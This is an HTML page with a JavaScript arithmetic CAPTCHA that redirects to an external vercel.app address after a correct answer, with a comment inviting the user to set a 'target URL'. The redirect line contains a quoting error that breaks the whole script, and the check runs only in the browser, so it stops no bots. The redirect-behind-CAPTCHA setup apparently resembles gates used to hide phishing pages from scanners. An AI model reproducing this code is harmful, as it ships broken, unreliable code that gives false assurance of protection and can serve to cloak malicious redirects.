<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CAPTCHA Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .captcha-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    .captcha-container h2 {
      text-align: center;
    }
    .captcha-box {
      margin: 20px 0;
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      background: #eee;
      padding: 10px;
      border-radius: 5px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .error {
      color: red;
      text-align: center;
      margin-top: 10px;
    }
    .success {
      color: green;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <h2>Verify You're Human</h2>
    <div class="captcha-box" id="captchaQuestion"></div>
    <input type="text" id="captchaInput" placeholder="Enter your answer" />
    <button onclick="validateCaptcha()">Submit</button>
    <div id="captchaMessage"></div>
  </div>

  <script>
    let num1, num2, answer;

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      answer = num1 + num2;
      document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
      document.getElementById("captchaMessage").innerHTML = '';
      document.getElementById("captchaInput").value = '';
    }

    function validateCaptcha() {
  const userAnswer = parseInt(document.getElementById("captchaInput").value);
  const messageEl = document.getElementById("captchaMessage");

  if (userAnswer === answer) {
    messageEl.innerHTML = "<p class='success'>Verified! Redirecting... âœ…</p>";
    setTimeout(() => {
      window.location.href = "https"//web-sr3h.vercel.app"; // <-- Change this to your target URL
    }, 1000); // 1 second delay before redirect
  } else {
    messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
    generateCaptcha();
  }
}


    window.onload = generateCaptcha;
  </script>
</body>
</html>
